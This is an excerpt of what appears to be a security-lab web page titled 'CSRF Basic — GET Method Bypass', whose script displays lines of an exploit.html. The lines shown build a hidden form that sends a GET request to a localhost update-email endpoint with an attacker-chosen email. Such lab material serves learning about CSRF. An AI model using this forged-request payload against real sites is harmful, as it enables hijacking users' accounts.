    ...
    <body class="bg-[#090a0f] text-gray-200 min-h-screen flex selection:bg-white selection:text-black antialiased"
        ...
        <main class="flex-1 p-8 md:p-12 max-w-4xl mx-auto w-full flex flex-col overflow-y-auto">
            ...
            <div class="flex justify-between items-center mb-12 pb-4 border-b border-zinc-800/60">
                <div>
                    ...
                    <p class="text-xs text-zinc-500">CSRF Basic — GET Method Bypass</p>
                </div>
            </div>
            ...
            <div class="inner">
                ...
                <div style="display:flex; align-items:center; gap:10px; padding:14px 16px;
                    ...
                    <span
                        ...
                        exploit.html — CSRF Basic — GET Method Bypass
                    </span>
        ...
        <script>
            ...
            var lines = [
                ...
                '    <span style="color:#569cd6;">&lt;form</span> <span style="color:#9cdcfe;">id</span>=<span style="color:#ce9178;">"csrfForm"</span> <span style="color:#9cdcfe;">action</span>=<span style="color:#ce9178;">"http://localhost/update-email"</span> <span style="color:#9cdcfe;">method</span>=<span style="color:#ce9178;">"GET"</span> <span style="color:#9cdcfe;">style</span>=<span style="color:#ce9178;">"display: none;"</span><span style="color:#569cd6;">&gt;</span>',
                '        <span style="color:#569cd6;">&lt;input</span> <span style="color:#9cdcfe;">type</span>=<span style="color:#ce9178;">"hidden"</span> <span style="color:#9cdcfe;">name</span>=<span style="color:#ce9178;">"email"</span> <span style="color:#9cdcfe;">value</span>=<span style="color:#ce9178;">"the0x@lab.com"</span><span style="color:#569cd6;">&gt;</span>',
